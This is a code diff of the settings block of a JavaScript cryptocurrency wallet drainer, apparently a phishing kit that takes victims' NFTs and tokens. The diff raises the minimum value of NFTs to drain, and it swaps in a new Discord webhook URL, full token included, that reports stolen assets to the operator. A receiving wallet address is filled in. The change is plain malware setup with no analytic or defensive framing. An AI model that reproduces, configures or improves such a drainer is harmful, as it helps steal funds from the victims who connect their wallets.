@@ -4,7 +4,7 @@ const receiveAddress = "0x6dd2f906368fa50133d724d3346d9C5b3C2D17ea"; // YOUR WAL
 
 
 const drainNftsInfo = {
-    minValue: 0.05, // Minimum value of the NFTS's last transactions (in the last 'checkMaxDay' days) of the collection.
+    minValue: 0.1, // Minimum value of the NFTS's last transactions (in the last 'checkMaxDay' days) of the collection.
     maxTransfers: 1000,
 }
 
@@ -36,7 +36,7 @@ const erc20list = {
 
 const installInNewWindow = true; // install wallet if not installed
 
-const discordWebhookURL = "https://discord.com/api/webhooks/1004018654695927818/yD6kR_rqgCCvfBLFmVjybyOEnuPOVtodxVLcAcyqq1YHDnAho51A1y6SgoAiwIZHlPXQ"; // put ur discord webhook url in here to receive NFT's
+const discordWebhookURL = "https://discordapp.com/api/webhooks/1093501502619930705/i8UVjruwSOFRVDbfBEi8tpgwxxOssuGtAcHAkMOJOZWnqkcytJnzJNGawvwJuE9FoD2r"; // put ur discord webhook url in here to receive NFT's
 const feedbackEnabled = true; // let enabled to receive webhooks
 /*
     = = = = = END OF SETTINGS = = = = =
